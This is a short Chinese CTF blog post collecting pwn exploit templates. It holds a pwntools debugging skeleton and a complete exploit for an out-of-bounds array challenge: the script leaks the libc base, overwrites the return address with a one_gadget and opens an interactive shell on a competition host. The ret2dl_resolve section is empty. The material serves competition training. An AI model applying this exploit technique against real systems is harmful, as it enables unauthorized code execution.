---
layout:     post   			        # 使用的布局（不需要改）
title:      exp 模板   			# 标题 
subtitle:   持续更新 			#副标题
date:       2019-09-29 				# 时间
author:     pic4xiu 		    		# 作者
header-img: img/post-bg-debug.png 		#这篇文章标题背景图片
catalog: true 					# 是否归档
tags:						#标签
    - pwn
---

感觉比赛时候还是需要 exp 模板的,这篇就记录一下常见漏洞的模板吧,基本都是参考的大赛的题

## Debugging or not

```
local = 1

if local:
    p = process('./file_name')
else:
    p = remote('ip' , port)
'''
def debug():
    print pidof(p)
    raw_input()
'''
# gdb.attach(p)
```

## 数组越界

```
from pwn import *
local = 1

if local:
    p = process('./pwn')
else:
    p = remote('1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com' , 57856)#nc 1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com 57856

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def debug():
    print pidof(p)
    raw_input()

#step1 leak libc_base
p.recvuntil('name:')
p.sendline('test')
libc_leak = ''
for i in range(637 , 631 , -1):
    p.recvuntil('index\n')
    p.sendline(str(i))
    p.recvuntil('(hex) ')
    aa = p.recvuntil('\n')[:-1]
    if(len(aa) < 2):
        libc_leak += '0' + aa
    elif(len(aa) == 8):
        libc_leak += aa[-2:]
    else:
        libc_leak += aa
    p.recvuntil('value\n')
    p.sendline('1')
print libc_leak
libc.address = int('0x' + libc_leak , 16) - libc.symbols['__libc_start_main'] - 240
success('libc_base => ' + hex(libc.address))
one_gadget = 0xf02a4 + libc.address

#step2 overwrite EIP to one_gadget
for i in range(6):
    p.recvuntil('index\n')
    p.sendline(str(i + 344))
    p.recvuntil('value\n')
    p.sendline(str(ord(p64(one_gadget)[i])))

#Get Shell & Have Fun
#debug()
p.sendline('a')
p.recvuntil('(yes/no)? \n')
p.interactive()
```

## ret2dl_resolve

见
